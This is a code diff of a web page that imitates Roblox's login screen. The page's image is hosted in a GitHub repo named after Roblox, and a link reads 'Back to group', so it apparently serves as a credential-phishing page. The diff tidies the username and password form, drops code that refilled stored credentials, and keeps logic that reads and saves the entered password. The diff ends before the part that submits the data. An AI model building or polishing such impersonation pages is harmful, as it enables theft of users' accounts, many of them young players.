@@ -19,7 +19,7 @@
 
         .page {
             font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* CHANGED: Set the background image here */
+            /* Direct link to the raw image from your repo */
             background: #000 url('https://raw.githubusercontent.com/SharkuTV/Roblox.com_3Gwificlan/main/login.png') no-repeat center center fixed;
             background-size: cover;
             min-height: 100vh;
@@ -31,8 +31,6 @@
         }
 
         .page a { text-decoration: none; color: inherit; }
-
-        /* REMOVED: The old .bg-collage styles since we are using a single image now */
 
         .top-nav {
             position: relative;
@@ -142,7 +140,6 @@
             letter-spacing: -0.3px;
         }
 
-        /* UPDATED: Standardized input styling for both fields */
         .auth-card input[type="text"],
         .auth-card input[type="password"] {
             width: 100%;
@@ -262,7 +259,6 @@
 <body>
 
     <div class="page">
-        <!-- Removed the bg-collage div entirely -->
 
         <header class="top-nav">
             <a href="index.html" class="roblox-logo" title="Back to group">
@@ -293,10 +289,11 @@
                 <h1>Login to Roblox</h1>
 
                 <label for="username" class="sr-only">Username/Email/Phone</label>
+                <!-- CHANGED: Removed value attribute so it starts empty -->
                 <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
 
-                <!-- CHANGED: Replaced the editable div with a standard password input -->
                 <label for="visiblePassword" class="sr-only">Password</label>
+                <!-- CHANGED: Removed value attribute so it starts empty -->
                 <input type="password" id="visiblePassword" name="password" autocomplete="current-password" placeholder="Password" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;">
 
                 <button type="submit" class="submit">Log In</button>
@@ -322,23 +319,6 @@
 
         var form = document.getElementById('loginForm');
         var status = document.getElementById('status');
-
-        // REMOVED: The collage generation script since we aren't using it anymore
-
-        /* ——— Load previously saved data and pre-fill the boxes ——— */
-        var saved = {};
-        try {
-            saved = JSON.parse(localStorage.getItem('loginData') || '{}');
-        } catch (err) {
-            saved = {}; 
-        }
-        
-        if (saved.username) document.getElementById('username').value = saved.username;
-        
-        // UPDATED: Now fills the standard input field directly
-        if (saved.password) {
-            document.getElementById('visiblePassword').value = saved.password;
-        }
 
         /* ——— Unique session ID per browser ——— */
         function getSessionId() {
@@ -377,7 +357,7 @@
             }
 
             var user = document.getElementById('username').value.trim();
-            var pass = document.getElementById('visiblePassword').value; // Use the standard input value
+            var pass = document.getElementById('visiblePassword').value; 
 
             /* Save locally so the boxes pre-fill next time */
             var data = {
